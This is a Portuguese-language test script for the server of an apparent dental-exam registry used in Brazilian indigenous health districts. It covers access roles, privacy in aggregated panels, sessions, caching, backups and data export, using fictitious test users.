T("faixa etária traz ceo-d e CPO-D com componentes", r.resumo.faixas["6 a 11 anos"].cpod && "p" in r.resumo.faixas["6 a 11 anos"].cpod);
T("comparação entre DSEIs não mostra percentual que revela grupo pequeno", r.comparacao.every(c => c.n === "<5" || c.alto !== "<5" || c.pctAlto == null), r.comparacao);
r = P(CARLA, { acao: "painel", dsei: "Yanomami" });
T("CD vê dados agregados de outro DSEI", r.ok && r.recorteDsei === "Yanomami");
T("painel agregado não traz códigos de pessoas", !JSON.stringify(r).includes("RR-SUR-SAU-KAAAAAA2"));

/* ---------------------------------------------------------------- reorganização da planilha */
parte("reorganização");
// Muitos exames com resultado errado, para conferir que o relatório lista todos (não só os primeiros).
for (let i = 0; i < 25; i++) P(ANA, { acao: "enviarExame", registro: exame({ id: "RL" + i, sufixo: "RQ" + "ABCDEFGHJKMNPQRSTUVWXYZ23"[i] + "XXXX2" }) });
for (let i = 0; i < 25; i++) { const j = jsonEx("RL" + i); j.resultado.cpod = { c: 4, p: 0, o: 0, total: 4 }; linhaEx("RL" + i)[aba("Exames")[0].length - 1] = JSON.stringify(j); }
const examesAntes = JSON.stringify(aba("Exames"));
const comErro = jsonEx("OK1"); comErro.resultado.ceod = { c: 0, e: 9, o: 0, total: 9 };
linhaEx("OK1")[aba("Exames")[0].length - 1] = JSON.stringify(comErro);
const usoAna = () => aba("Uso").filter(l => l[2] === ANA.email)[0] || [];
G.ctx.recalcularUso(G.ctx.planilha(), G.ctx.lerResumos());   // a tarefa diária leva os contadores para a aba Uso
const usoAntes = usoAna().slice();
G.est.props.FORMATO_PLANILHA = "21";
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "DURANTE", sufixo: "DURANTE2" }) });
T("com exames na planilha, a reorganização NÃO acontece sozinha", G.est.props.FORMATO_PLANILHA === "21");
T("enquanto pendente, envio de exame espera (manutenção) e nada é gravado", !r.ok && r.manutencao && !linhaEx("DURANTE"), r);
T("pedido de acesso também espera", G.post({ acao: "pedirAcesso", nome: "A", cro: "RR 3", email: "durante@teste.org", uf: "RR", dsei: "Yanomami" }).manutencao === true);
r = P(ANA, { acao: "painel" });
T("leituras continuam funcionando", r.ok, r.erro);
r = P(C, { acao: "entrar" });
T("a titular é avisada ao entrar", r.ok && r.reorganizacaoPendente === true, r);
T("Administração mostra a pendência", P(C, { acao: "admin" }).reorganizacaoPendente === true);
r = P(PAULA, { acao: "reorganizar" });
T("só a coordenação titular confirma", !r.ok && G.est.props.FORMATO_PLANILHA === "21", r);
r = P(C, { acao: "previaReorganizacao" });
T("prévia mostra quantos exames mudam, sem gravar nada", r.ok && r.relatorio.mudam >= 1 && r.relatorio.ceod >= 1 && G.est.props.FORMATO_PLANILHA === "21", r.relatorio);
G.est.falharBackup = true;
r = P(C, { acao: "reorganizar" });
T("se o backup falhar, a reorganização é cancelada e nada muda", !r.ok && /backup/.test(r.erro) && G.est.props.FORMATO_PLANILHA === "21" && jsonEx("OK1").resultado.ceod.e === 9, r);
G.est.falharBackup = false;
const nBackups = G.est.backups.length;
r = P(C, { acao: "reorganizar" });
T("com backup, a titular atualiza a planilha", r.ok && G.ctx.formatoAtual() && G.est.backups.length === nBackups + 1, r);
T("o resultado errado foi recalculado", jsonEx("OK1").resultado.ceod.e === 0);
T("relatório antes/depois gravado na planilha", aba("Relatório da reorganização").some(l => l[0] === "OK1"));
T("o relatório lista todos os exames que mudaram (26), não só uma amostra", aba("Relatório da reorganização").length - 1 === r.resultado.relatorio.mudam && r.resultado.relatorio.mudam >= 26, [aba("Relatório da reorganização").length - 1, r.resultado.relatorio.mudam]);
T("a resposta ao app leva no máximo 20 exemplos", r.resultado.relatorio.exemplos.length <= 20, r.resultado.relatorio.exemplos.length);
T("Acessos registra quantos exames mudaram e o backup", aba("Acessos").some(l => l[7] === "Reorganizou a planilha" && /com resultado recalculado/.test(l[8]) && /backup antes/.test(l[8])));
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "DEPOIS", sufixo: "DEPXSAA2" }) });
T("a aba Uso mantém as entradas e consultas já contadas", usoAntes[8] > 0 && usoAna()[8] === usoAntes[8] && usoAna()[9] === usoAntes[9], [usoAntes.slice(6, 12), usoAna().slice(6, 12)]);
T("e refaz a contagem de exames a partir da aba Exames", usoAna()[10] >= 25, usoAna().slice(10, 12));
T("depois de concluída, os envios voltam", r.ok, r);
T("os outros exames continuam lá", JSON.parse(examesAntes).length <= aba("Exames").length);

/* ---------------------------------------------------------------- reativação */
parte("reativação");
r = G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi Dentista", cro: "RR 4242", email: "davi@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
r = P(RT, { acao: "aprovar", id: S.idDe("davi@teste.org") });
const DAVI = { email: "davi@teste.org", codigo: S.codigoDoEmail("davi@teste.org") };
T("novo dentista aprovado entra", P(DAVI, { acao: "entrar" }).ok);
r = P(RT, { acao: "desativar", id: S.idDe("davi@teste.org") });
T("RT desativa o dentista", r.ok && !P(DAVI, { acao: "entrar" }).ok, r);
const mRT = mailsPara("rt@teste.org").length;
r = G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi D.", cro: "RR 9999", email: "davi@teste.org", uf: "RR", dsei: "Leste de Roraima", perfil: "rt" });
const davi = () => aba("Usuarios").slice(1).find(l => l[3] === "davi@teste.org");
T("pedido de quem foi desativado vira pedido de reativação", r.ok && r.reativacao === true, r);
T("o cadastro não muda: continua desativado, no mesmo DSEI e perfil", davi()[8] === "desativado" && davi()[5] === "Yanomami" && davi()[7] === "dentista" && davi()[1] === "Davi Dentista", davi());
T("a resposta avisa que DSEI e perfil continuam os do cadastro", r.mudouDados === true && r.dseiCadastro === "Yanomami");
T("a RT do DSEI recebe o aviso de reativação", mailsPara("rt@teste.org").length === mRT + 1 && /reativação/i.test(mailsPara("rt@teste.org").at(-1).subject));
T("Acessos registra \"Pediu reativação\"", aba("Acessos").some(l => l[7] === "Pediu reativação"));
T("a Equipe da RT mostra que a pessoa pediu reativação", (() => { const m = P(RT, { acao: "equipe" }).membros.find(x => x.email === "davi@teste.org"); return m && m.status === "desativado" && new Date(m.pedido_em) > new Date(m.aprovado_em); })());
G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi Dentista", cro: "RR 4242", email: "davi@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
T("pedir de novo no mesmo dia não manda outro e-mail", mailsPara("rt@teste.org").length === mRT + 1);
r = P(RT, { acao: "reativar", id: S.idDe("davi@teste.org") });
T("a RT reativa e a pessoa volta a entrar com o código de antes", r.ok && P(DAVI, { acao: "entrar" }).ok, r);
T("a reativação conta como nova aprovação (quem e quando)", davi()[11] === "Rita RT" && new Date(davi()[12]) >= new Date(davi()[10]), davi());

/* ---------------------------------------------------------------- aviso da aba Acessos */
parte("auditoria");
// Duas requisições ao mesmo tempo: a outra já criou a aba Acessos entre a procura e a criação.
(() => {
  const real = G.ctx.planilha(); let vezes = 0;
  const falsa = { getSheetByName: n => (vezes++ === 0 ? null : real.getSheetByName(n)), insertSheet: () => { throw new Error('Já existe uma página chamada "Acessos".'); } };
  let abaR = null, erro = null;
  try { abaR = G.ctx.obterAba(falsa, "Acessos", aba("Acessos")[0]); } catch (x) { erro = x; }
  T("se outra requisição criou a aba no mesmo instante, o servidor usa essa aba em vez de falhar", !erro && !!abaR && abaR.getName() === "Acessos", erro && String(erro));
})();
G.est.props.AUDITORIA_FALHAS = "2"; G.est.props.AUDITORIA_ULTIMA = "2026-10-29T13:33:22.924Z · Tentativa de acesso recusada · Exception";
T("a Administração mostra o aviso", P(C, { acao: "admin" }).auditoria.falhas === 2);
T("coordenação que não é a titular não limpa o aviso", !P(PAULA, { acao: "limparAvisoAuditoria" }).ok && G.est.props.AUDITORIA_FALHAS === "2");
r = P(C, { acao: "limparAvisoAuditoria" });
T("a titular limpa o aviso", r.ok && P(C, { acao: "admin" }).auditoria.falhas === 0, r);
T("a limpeza fica registrada em Acessos", aba("Acessos").some(l => l[7] === "Limpou aviso de auditoria" && /2 registros/.test(l[8])));

/* ---------------------------------------------------------------- versão 37: envio em lote e fila */
parte("lote e fila");
const lote = Array.from({ length: 12 }, (_, i) => exame({ id: "LT" + i, sufixo: "QTRA" + "ABCDEFGHJKMN"[i] + "XX2" }));
r = P(ANA, { acao: "enviarExames", registros: lote });
T("lote: o servidor aceita até 10 exames por pedido e responde um resultado para cada", r.ok && r.resultados.length === 10 && r.resultados.every(x => x.ok), r.resultados && r.resultados.filter(x => !x.ok));
T("lote: os 10 foram gravados, cada um numa linha", ["LT0", "LT5", "LT9"].every(id => linhaEx(id)) && !linhaEx("LT10"));
const ruimLote = exame({ id: "LTRUIM", sufixo: "QTRRUMX2", dsei: "Leste de Roraima", uf: "RR" });
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "LTBOM", sufixo: "QTRBMWX2" }), ruimLote] });
T("lote: um exame recusado não impede os outros", r.ok && r.resultados[0].ok && !r.resultados[1].ok && r.resultados[1].dseiInvalido, r.resultados);
const nLinhas = aba("Exames").length;
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "LT0", sufixo: "QTRAAXX2" })] });
T("lote: reenviar o mesmo exame atualiza a mesma linha (não cria outra)", r.ok && r.resultados[0].ok && aba("Exames").length === nLinhas, [nLinhas, aba("Exames").length]);
G.est.travaOcupada = true;
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "LTOCUP", sufixo: "QTRQCUP2" })] });
G.est.travaOcupada = false;
T("fila cheia: o servidor responde \"ocupado\" na hora, com um tempo sorteado entre 15 e 45 s para tentar de novo", !r.ok && r.ocupado && r.passageiro && r.tenteEm >= 15 && r.tenteEm <= 45 && !linhaEx("LTOCUP"), r);
const extra = exame({ id: "LTEXTRA", sufixo: "QTREXTR2" }); extra.nome = "Maria da Silva"; extra.dentes[16].paciente = "x"; extra.crianca.mae = "Joana";
r = P(ANA, { acao: "enviarExame", registro: extra });
const je = r.ok ? jsonEx("LTEXTRA") : {};
T("campos fora da lista são descartados (nome, mãe, campo estranho num dente)", r.ok && !("nome" in je) && !("mae" in je.crianca) && !("paciente" in je.dentes[16]), r);
T("o descarte fica anotado em Acessos", aba("Acessos").some(l => l[7] === "Campos descartados de um exame" && /LTEXTRA/.test(l[8]) && /dente 16\.paciente/.test(l[8])));
r = P(ANA, { acao: "meusExames" });
T("Meus exames traz só o resumo (sem os dentes), para ser leve", r.ok && r.exames.length && r.exames.every(x => !x.dentes && x.est && x.procsR), r.exames && r.exames[0] && Object.keys(r.exames[0]));
r = P(ANA, { acao: "verExame", id: "LT3" });
T("ao abrir um exame, ele vem completo (com os dentes)", r.ok && r.exame.dentes && Object.keys(r.exame.dentes).length === 52 && !("_linha" in r.exame), r.ok && Object.keys(r.exame));

/* ---------------------------------------------------------------- cópia rápida */
parte("cópia rápida");
// O índice e os resumos ficam na memória rápida: depois da primeira leitura, as páginas não leem a aba Exames de novo.
const lidas = () => G.est.leituras.Exames || 0;
P(ANA, { acao: "meusExames" });
let antes = lidas();
r = P(ANA, { acao: "meusExames" });
T("com a cópia rápida, abrir Meus exames de novo não lê a aba Exames", r.ok && lidas() === antes, [antes, lidas()]);
P(ANA, { acao: "inicio" }); antes = lidas(); P(RT, { acao: "inicio" });
T("a página inicial também usa a cópia (outra pessoa, mesmo DSEI)", lidas() === antes, [antes, lidas()]);
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPNOVO", sufixo: "QTRCPNV2" })] });
antes = lidas();
r = P(ANA, { acao: "meusExames" });
T("depois de um envio, a cópia já vem com o exame novo, sem reler a planilha", r.ok && r.exames.some(x => x.id === "CPNOVO") && lidas() === antes, [antes, lidas()]);
// Fora de um pedido, começa uma "memória do pedido" nova (como o servidor faz a cada pedido).
const novoPedido = () => require("vm").runInContext("MEMO = null", G.ctx);
const comparar = () => {
  novoPedido();
  const ind = G.ctx.lerIndiceDaPlanilha().map(G.ctx.empacotarIndice), res = G.ctx.lerResumosDaPlanilha();
  const cI = G.ctx.copiaDosExames("indice"), cR0 = G.ctx.copiaDosExames("resumos"), cR = cR0 && G.ctx.numerarResumos(cR0);
  const ord = l => JSON.stringify(l.slice().sort((a, b) => JSON.stringify(a) < JSON.stringify(b) ? -1 : 1));
  return { indice: !!cI && ord(cI) === ord(JSON.parse(JSON.stringify(ind))), resumos: !!cR && ord(cR) === ord(JSON.parse(JSON.stringify(res))), atual: !!cI && !!cR };
};
let cmp = comparar();
T("a cópia do índice e dos resumos é igual à planilha, campo por campo", cmp.indice && cmp.resumos && cmp.atual, cmp);
r = P(ANA, { acao: "cancelarExame", id: "CPNOVO", motivo: "Exame em duplicidade" });
cmp = comparar();
T("cancelar um exame também atualiza a cópia (igual à planilha)", r.ok && cmp.indice && cmp.resumos && cmp.atual, [r, cmp]);
// Alguém apaga uma linha à mão na aba Exames: o número de linhas não bate e a cópia é refeita da planilha.
const linhaApagada = aba("Exames").splice(aba("Exames").findIndex(l => l[0] === "LT9"), 1)[0];
antes = lidas();
r = P(ANA, { acao: "meusExames" });
T("linha apagada à mão: a cópia é descartada e a planilha é lida de novo", r.ok && !r.exames.some(x => x.id === "LT9") && lidas() > antes, [antes, lidas()]);
aba("Exames").push(linhaApagada); editouAMao("Exames");
// Enquanto alguém está gravando (com a trava), quem só lê não guarda cópia (poderia guardar uma foto pela metade):
// deixa o pedido para o próximo envio refazer.
G.ctx.esquecerDaMemoria("resumos+"); G.est.travaOcupada = true;
P(ANA, { acao: "meusExames" });
G.est.travaOcupada = false;
T("com a trava ocupada, a leitura não guarda cópia (e pede para o próximo envio refazer)", G.ctx.lerDaMemoria("resumos+") === null && !!G.est.cache["refazer:resumos"]);
P(ANA, { acao: "meusExames" });
T("com a trava livre, a leitura guarda a cópia de novo", !!G.ctx.lerDaMemoria("resumos+") && !G.est.cache["refazer:resumos"]);
// Emendas: cada envio só acrescenta o que mudou; a base grande fica como está.
const baseAntes = G.ctx.lerDaMemoria("resumos").id;
P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPEM1", sufixo: "QTREMUM2" }), exame({ id: "CPEM2", sufixo: "QTREMDS2" })] });
const em = G.ctx.lerDaMemoria("resumos+");
T("um envio só regrava as emendas (pequenas), não a lista inteira", em.base === baseAntes && "CPEM1" in em.itens && "CPEM2" in em.itens && G.ctx.lerDaMemoria("resumos").id === baseAntes, em && Object.keys(em.itens));
cmp = comparar();
T("base + emendas = planilha", cmp.indice && cmp.resumos, cmp);
// A memória do Google guarda por até 6 horas: depois de 3 horas, o próximo envio regrava a base (com as emendas dentro).
(() => { novoPedido(); const e = G.ctx.lerDaMemoria("resumos+"); e.criada = Date.now() - 4 * 3600e3; G.ctx.guardarNaMemoria("resumos+", e, 600); })();
P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPEM4", sufixo: "QTREMQT2" })] });
const em4 = G.ctx.lerDaMemoria("resumos+");
cmp = comparar();
T("base com mais de 3 horas: o envio seguinte regrava a base, e ela continua igual à planilha", em4.base !== baseAntes && !Object.keys(em4.itens).length && cmp.resumos && cmp.indice, [em4 && Object.keys(em4.itens), cmp]);
// Um envio que o Google interrompe no meio deixa a marca "gravando": o próximo envio não confia na cópia e refaz da planilha.
G.est.cache["indice+"] && (() => { novoPedido(); const e = G.ctx.lerDaMemoria("indice+"); e.itens.FANTASMA = ["FANTASMA", "X", 1, 0, "", "Yanomami", "", "", "", "", "", 9999]; G.ctx.guardarNaMemoria("indice+", e, 600); })();
G.est.cache.gravando = { v: "1", exp: Date.now() + 60000 };
P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPEM3", sufixo: "QTREMTR2" })] });
cmp = comparar();
T("envio interrompido no meio: o próximo refaz a cópia da planilha", cmp.indice && cmp.resumos && !G.ctx.copiaDosExames("indice").some(x => x[0] === "FANTASMA") && !G.est.cache.gravando, cmp);
// Se a cópia apontar a linha errada (alguém mexeu à mão), o servidor confere antes de escrever por cima e não estraga outro exame.
(() => { novoPedido(); const e = G.ctx.lerDaMemoria("indice+"), cI = G.ctx.copiaDosExames("indice"), l3 = cI.find(x => x[0] === "LT3").slice(), l4 = cI.find(x => x[0] === "LT4");
  l3[11] = l4[11]; e.itens.LT3 = l3; G.ctx.guardarNaMemoria("indice+", e, 600); })();
const lt4Antes = JSON.stringify(linhaEx("LT4"));
r = P(ANA, { acao: "enviarExames", registros: [Object.assign(exame({ id: "LT3", sufixo: "QTRADXX2" }), { atualizadoEm: "2026-10-25T12:00:00.000Z" })] });
T("linha errada na cópia: confere o id antes de escrever e grava na linha certa", r.ok && r.resultados[0].ok && JSON.stringify(linhaEx("LT4")) === lt4Antes && jsonEx("LT3").atualizadoEm === "2026-10-25T12:00:00.000Z"
  && aba("Exames").filter(l => l[0] === "LT3").length === 1, r.resultados);
cmp = comparar();
T("e a cópia volta a ficar igual à planilha", cmp.indice && cmp.resumos, cmp);
// Exames novos de um lote vão para a planilha numa escrita só, antes da resposta ao app.
G.est.escritas.Exames = 0;
r = P(ANA, { acao: "enviarExames", registros: Array.from({ length: 10 }, (_, i) => exame({ id: "UMA" + i, sufixo: "QTRU" + "ABCDEFGHJK"[i] + "XX2" })) });
T("lote de 10 exames novos: uma escrita só na aba Exames", r.ok && r.resultados.every(x => x.ok) && G.est.escritas.Exames === 1 && ["UMA0", "UMA9"].every(id => linhaEx(id)), [G.est.escritas.Exames, r.resultados.filter(x => !x.ok)]);
// No mesmo lote: o 1º exame da pessoa e o 2º (ligado ao 1º), e o mesmo exame mandado duas vezes.
const p1 = exame({ id: "MLA1", sufixo: "QTRMQAX2", data: "2026-10-02" }), p2 = exame({ id: "MLA2", data: "2026-10-09", vinculo: { codigoIndividuo: "RR-SUR-SAU-QTRMQAX2", chaves: [] } });
r = P(ANA, { acao: "enviarExames", registros: [p1, p2, Object.assign(JSON.parse(JSON.stringify(p1)), { atualizadoEm: "2026-10-03T12:00:00.000Z" })] });
T("no mesmo lote: o 2º exame acha o 1º (ainda esperando para ser gravado) e o repetido não vira outra linha",
  r.ok && r.resultados.every(x => x.ok) && r.resultados[1].numeroExame === 2 && aba("Exames").filter(l => l[0] === "MLA1").length === 1 && jsonEx("MLA1").atualizadoEm === "2026-10-03T12:00:00.000Z", r.resultados);
cmp = comparar();
T("e a cópia rápida continua igual à planilha", cmp.indice && cmp.resumos, cmp);
// Se a escrita final falhar, o app NÃO recebe "deu certo": recebe erro passageiro e manda de novo.
G.est.falharEscrita = "Exames";
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "FALHA1", sufixo: "QTRFQHX2" })] });
G.est.falharEscrita = null; delete G.est.props.ERROS_EMAIL_EM; G.est.mails = G.est.mails.filter(m => !/erro/i.test(m.subject || "")); // (os testes de e-mail de erro vêm depois)
T("escrita na planilha falhou: o app recebe erro passageiro (o exame continua no aparelho)", !r.ok && r.passageiro && !linhaEx("FALHA1"), r);
cmp = comparar();
T("e a cópia rápida não ficou com o exame que não foi gravado", !(G.ctx.copiaDosExames("indice") || []).some(x => x[0] === "FALHA1"), cmp);
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "FALHA1", sufixo: "QTRFQHX2" })] });
T("na tentativa seguinte, grava normalmente", r.ok && r.resultados[0].ok && linhaEx("FALHA1"), r);
// A memória rápida guarda listas grandes comprimidas e em pedaços (cada pedaço tem até 100 KB no Google).
const grande = Array.from({ length: 6000 }, (_, i) => ["id-" + i + "-" + Math.random().toString(36).slice(2), "RR-123-456-ABCD" + i, 1, 0, "2026-10-01", "Yanomami", "u" + i]);
T("lista grande: guardada comprimida, em pedaços, e lida igual", G.ctx.guardarNaMemoria("teste", grande, 60) && JSON.stringify(G.ctx.lerDaMemoria("teste")) === JSON.stringify(grande)
  && /:1$/.test(G.est.cache.teste.v), G.est.cache.teste && G.est.cache.teste.v);
const ptr = G.est.cache.teste.v.split(":"); delete G.est.cache["teste:" + ptr[0] + ":0"];
T("se a memória perder um pedaço, a lista não é usada (lê da planilha)", G.ctx.lerDaMemoria("teste") === null);

/* ---------------------------------------------------------------- sessão */
parte("sessão");
r = P(ANA, { acao: "entrar", aparelho: "teste" });
const SES = { email: ANA.email, sessao: r.sessao };
T("ao entrar com o código, o app recebe uma sessão", r.ok && /^[0-9a-f]{80}$/.test(r.sessao) && r.diasSessao === 15, r);
const sessoes = () => Object.keys(G.est.props).filter(k => k.startsWith("sessao_")).map(k => [k, JSON.parse(G.est.props[k])]);
T("a sessão fica nas Propriedades do script, só o hash (nem na planilha, nem em texto)", !JSON.stringify(G.est.sheets).includes(r.sessao) && !JSON.stringify(G.est.props).includes(r.sessao) && sessoes().length >= 1 && !G.est.sheets._sessoes);
T("com a sessão, o app usa o servidor sem mandar o código", P(SES, { acao: "inicio" }).ok);
T("ao entrar pela sessão, não cria outra sessão", !P(SES, { acao: "entrar" }).sessao);
T("sessão com outro e-mail não vale", !P({ email: BRUNO.email, sessao: SES.sessao }, { acao: "inicio" }).ok);
const kAna = sessoes().find(([k, v]) => v.u === S.idDe("ana@teste.org") && v.ap === "teste")[0];
const usoSessao = d => { const v = JSON.parse(G.est.props[kAna]); v.uso = new Date(Date.now() - d * 864e5).toISOString(); G.est.props[kAna] = JSON.stringify(v); };
usoSessao(16);
r = P(SES, { acao: "inicio" });
T("sessão sem uso há mais de 15 dias vence, com mensagem clara", !r.ok && r.semAcesso && r.sessaoVencida && /15 dias/.test(r.erro) && /continuam/.test(r.erro), r);
usoSessao(14);
T("com 14 dias sem uso, ainda vale (e o uso renova a contagem)", P(SES, { acao: "inicio" }).ok && new Date(JSON.parse(G.est.props[kAna]).uso) > new Date(Date.now() - 864e5));
P(RT, { acao: "novoCodigo", id: S.idDe("ana@teste.org") });
T("um código novo para a pessoa derruba as sessões antigas", !P(SES, { acao: "inicio" }).ok);
const novoCodAna = S.codigoDoEmail("ana@teste.org"); ANA.codigo = novoCodAna;
r = P(C, { acao: "entrar" }); const SESC = { email: C.email, sessao: r.sessao };
T("a coordenação titular também recebe sessão", r.ok && P(SESC, { acao: "admin" }).ok);
G.est.props.CHAVE_COORDENACAO = "outra-senha-bem-longa-2026";
T("trocar a senha da titular derruba as sessões dela", !P(SESC, { acao: "admin" }).ok);
G.est.props.CHAVE_COORDENACAO = S.SENHA_TITULAR;
// Muitas pessoas entrando ao mesmo tempo: cada sessão é guardada à parte (nenhuma apaga a outra).
const antesS = sessoes().length, muitas = Array.from({ length: 40 }, () => P(BRUNO, { acao: "entrar", aparelho: "lote" }).sessao);
T("40 entradas seguidas: 40 sessões diferentes, todas valendo", new Set(muitas).size === 40 && sessoes().length === antesS + 40 && muitas.every(t => P({ email: BRUNO.email, sessao: t }, { acao: "inicio" }).ok));
usoSessao(20); const nS = sessoes().length;
G.ctx.limparSessoes();
T("a tarefa diária apaga as sessões vencidas", sessoes().length === nS - 1 && !G.est.props[kAna]);
// Uso: contador leve a cada entrada; a aba é refeita na tarefa diária.
const kUso = "uso_" + S.idDe("bruno@teste.org");
T("cada entrada vira um contador leve (sem regravar a aba Uso)", JSON.parse(G.est.props[kUso] || "{}").e >= 40);
G.ctx.tarefaDiaria();
const usoB = aba("Uso").find(l => l[0] === S.idDe("bruno@teste.org")) || [];
T("a tarefa diária leva os contadores para a aba Uso e conta os exames", Number(usoB[8]) >= 40 && Number(usoB[10]) >= 1 && !G.est.props[kUso], usoB);

/* ---------------------------------------------------------------- erros explicados, espaço e tarefa diária */
parte("erros e espaço");
T("o endereço /exec mostra só a versão", Object.keys(G.get()).join() === "ok,versao" && G.get().versao >= 34, G.get());
const realPainel = G.ctx.calcularPainel;
G.ctx.calcularPainel = () => { throw new Error("Exception: Service Spreadsheets timed out while accessing document with id 1xYzAbC"); };
const mailsAntes = G.est.mails.length;
G.est.cache = {};
r = P(ANA, { acao: "painel", dsei: "Leste de Roraima" });
T("o profissional vê só uma mensagem simples, sem o detalhe técnico", !r.ok && r.passageiro && !/Spreadsheets|1xYz|Exception/.test(r.erro), r.erro);
r = P(C, { acao: "admin" });
const ge = r.ok && r.erros && r.erros.grupos.find(x => x.tipo === "google_lento");
T("Administração (titular) mostra o motivo explicado e o que fazer", !!ge && /demorou/.test(ge.titulo) && ge.fazer && ge.exemplos[0].detalhe.includes("timed out"), r.erros);
T("a titular recebe um e-mail explicando o erro", G.est.mails.length === mailsAntes + 1 && /Motivo:/.test(G.est.mails[G.est.mails.length - 1].body));
P(ANA, { acao: "painel", dsei: "Xavante" });
T("no máximo um e-mail a cada 6 horas", G.est.mails.length === mailsAntes + 1);
G.ctx.calcularPainel = realPainel;
T("outra pessoa da coordenação não vê o quadro de erros nem o espaço", P(PAULA, { acao: "admin" }).erros === null && P(PAULA, { acao: "admin" }).espaco === null);
T("a titular limpa a lista de erros", P(C, { acao: "limparErros" }).ok && P(C, { acao: "admin" }).erros.grupos.length === 0);
T("tipos de erro reconhecidos", ["Lock timeout: another process was holding the lock", "Service invoked too many times for one day: email.", "Exceeded maximum execution time",
  "You do not have permission to call SpreadsheetApp", "The number of columns in the data does not match the number of columns in the range"].map(G.ctx.tipoDoErro).join() === "fila,cota_email,google_lento,autorizacao,planilha_alterada");
r = P(C, { acao: "admin" });
T("Administração mostra o espaço usado, quantos exames ainda cabem e a situação do servidor", r.espaco && r.espaco.pct >= 0 && r.espaco.cabem > 0 && r.instalacao && r.instalacao.chave === "ok" && r.versaoServidor === G.get().versao, r.espaco);
T("a tarefa diária é criada sozinha", G.est.triggers.some(t => t.fn === "tarefaDiaria"));
const ex0 = G.est.max.Exames || { r: 1000 };
G.est.max.Usuarios = { r: 5000, c: 40 };
const velho = aba("Acessos")[1].slice(); velho[0] = "2024-01-02";
aba("Acessos").push(velho);
const nAc = aba("Acessos").length;
G.ctx.tarefaDiaria();
T("tarefa diária: corta as linhas e colunas vazias", G.est.max.Usuarios.r <= aba("Usuarios").length + 50 && G.est.max.Usuarios.c < 40, G.est.max.Usuarios);
const arq = Object.values(G.est.extras)[0];
T("tarefa diária: Acessos com mais de 12 meses vão para a planilha de arquivo (nada se perde)", aba("Acessos").length === nAc - 1 && arq && arq.abas.Acessos.some(l => l[0] === "2024-01-02"), [nAc, aba("Acessos").length]);
G.est.max.Exames = { r: 60000, c: 2 };   // 60 mil linhas × 113 colunas: a planilha passa da metade
G.ctx.conferirEspaco();
const mE = G.est.mails[G.est.mails.length - 1];
T("aviso de espaço: e-mail quando passa de uma faixa (50%, 60%...)", /espaço usado/.test(mE.subject) && /Cabem ainda/.test(mE.body), mE.subject);
const nM = G.est.mails.length; G.ctx.conferirEspaco();
T("cada faixa avisa uma vez só", G.est.mails.length === nM);
G.est.max.Exames = ex0;

/* ---------------------------------------------------------------- dados para análise */
parte("dados para análise");
r = P(C, { acao: "dadosAnalise", pagina: 0 });
T("coordenação: arquivo de análise com o cabeçalho das três partes e uma linha por exame", r.ok && r.cabecalho.length === G.ctx.CAB_ANALISE.length && r.linhas.length > 10 && r.linhas.every(l => l.length === r.cabecalho.length), r.ok && r.linhas.length);
const iLT = r.cabecalho.indexOf("id_exame"), iD16 = r.cabecalho.indexOf("d16_situacao");
T("cada linha traz o detalhe de cada dente", r.linhas.some(l => l[iLT] === "LT1" && l[iD16] === "presente"));
r = P(ANA, { acao: "dadosAnalise", pagina: 0 });
T("profissional: só os próprios exames", r.ok && r.linhas.every(l => r.cabecalho[0] === "codigo_individuo") && !r.linhas.some(l => /^PN/.test(l[iLT])), r.linhas.map(l => l[iLT]).slice(0, 5));
r = P(C, { acao: "dadosAnalise", pagina: 0, de: "2030-01-01" });
T("filtro por período", r.ok && r.linhas.length === 0);
T("baixar dados fica registrado em Acessos", aba("Acessos").some(l => l[7] === "Baixou dados para análise"));

/* ---------------------------------------------------------------- geral */
parte("geral");
G.ctx.escreverDicionario(G.ctx.planilha());
const dic = aba("Dicionário").filter(l => l[0] === "Exames").map(l => String(l[1])).join(" · ");
const semDic = G.ctx.CAB_EXAME.filter(k => !dic.split(" · ").includes(k) && !(/^vig_/.test(k) && dic.includes(k)) && !/^n_/.test(k));
T("o Dicionário explica todas as colunas da aba Exames", !semDic.length && dic.includes("n_<tratamento>_indicado"), semDic);
T("nenhuma célula gravada como fórmula em todo o teste", G.est.formulas.length === 0, G.est.formulas.slice(0, 5));
P(ANA, { acao: "meusExames" });
cmp = comparar();
T("no fim de todo o teste (envios, cancelamentos, renumerações, reorganização), a cópia rápida continua igual à planilha", cmp.indice && cmp.resumos && cmp.atual, cmp);
T("nenhuma senha ou código de acesso gravado em texto na planilha", !JSON.stringify(G.est.sheets).includes(S.SENHA_TITULAR) && !JSON.stringify(G.est.sheets).includes(ANA.codigo));

console.log(falhas ? `\n${falhas} de ${total} verificações FALHARAM.` : `\nTudo certo: ${total} verificações do servidor passaram.`);
process.exit(falhas ? 1 : 0);
